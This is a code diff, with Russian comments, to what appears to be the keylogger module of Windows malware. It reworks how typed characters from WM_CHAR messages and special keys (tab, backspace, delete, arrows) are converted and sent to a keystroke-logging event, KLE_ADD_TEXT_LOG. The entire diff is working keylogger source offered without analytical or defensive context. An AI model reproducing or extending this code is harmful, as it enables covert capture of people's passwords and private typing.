@@ -650,7 +650,7 @@ bool GetNonPrintCharText(DWORD Char, PCHAR &Buf)
 	return true;
 }
 
-void ProcessCharMessage(PMSG Msg, bool IsUnicode)
+void ProcessCharMessage2(PMSG Msg, bool IsUnicode)
 {
 	// Отображаем отображение символа WM_CHAR
 	PKeyLogger Logger = GetLogger(true);
@@ -714,11 +714,6 @@ void ProcessCharMessage(PMSG Msg, bool IsUnicode)
 
 	if (Buf != NULL)
 	{
-		// Вызываем событие
-		PCHAR S = STR::New(Buf, BufLen);
-        KeyLogger::CallEvent(KLE_ADD_TEXT_LOG, S);
-		STR::Free(S);
-
 		KeyLogger::AddStrToBuffer(NULL, Buf, BufLen);
 		if (FreeBuf)
 			STR::Free(Buf);
@@ -728,6 +723,23 @@ void ProcessCharMessage(PMSG Msg, bool IsUnicode)
     	KeyLogger::IncActionCounter();
 }
 //---------------------------------------------------------------------------
+
+void ProcessCharMessage(PMSG Msg, bool IsUnicode)
+{
+	char keyChar[2];
+	if( IsUnicode )
+	{
+		wchar_t keyWChar[2];
+		keyWChar[0] = Msg->wParam;
+		keyWChar[1] = 0;
+		pWideCharToMultiByte( 1251, 0, keyWChar, 1, keyChar, 1, 0, 0 );
+	}
+	else
+		keyChar[0] = Msg->wParam;
+	keyChar[1] = 0;
+	KeyLogger::CallEvent(KLE_ADD_TEXT_LOG, keyChar);
+	ProcessCharMessage2( Msg, IsUnicode );
+}
 
 void ProcessKeyDownMessage(PMSG Msg)
 {
@@ -741,8 +753,9 @@ void ProcessKeyDownMessage(PMSG Msg)
 	// служебных символов
 
 	const static DWORD SupportChars[] =
-
-		{VK_TAB, VK_DELETE, VK_LEFT, VK_RIGHT, VK_UP, VK_DOWN, 0};
+		{VK_TAB, VK_BACK, VK_DELETE, VK_LEFT, VK_RIGHT, VK_UP, VK_DOWN, 0};
+	const static char CHAR_KB[] = 
+		{CHAR_TAB, CHAR_BACK, CHAR_DELETE, CHAR_LEFT, CHAR_RIGHT, CHAR_UP, CHAR_DOWN, 0};
 
 
 	bool Supported = false;
@@ -751,12 +764,19 @@ void ProcessKeyDownMessage(PMSG Msg)
 		if (SupportChars[i] == Msg->wParam)
 		{
 			Supported = true;
+			
+			//вызываем событие для служебных символов
+			char keyChar[2];
+			keyChar[0] = CHAR_KB[i];
+			keyChar[1] = 0;
+			KeyLogger::CallEvent(KLE_ADD_TEXT_LOG, keyChar);
+
 			break;
         }
 	}
 
 	if (Supported)
-		ProcessCharMessage(Msg, false);
+		ProcessCharMessage2(Msg, false);
 }
 //---------------------------------------------------------------------------
 
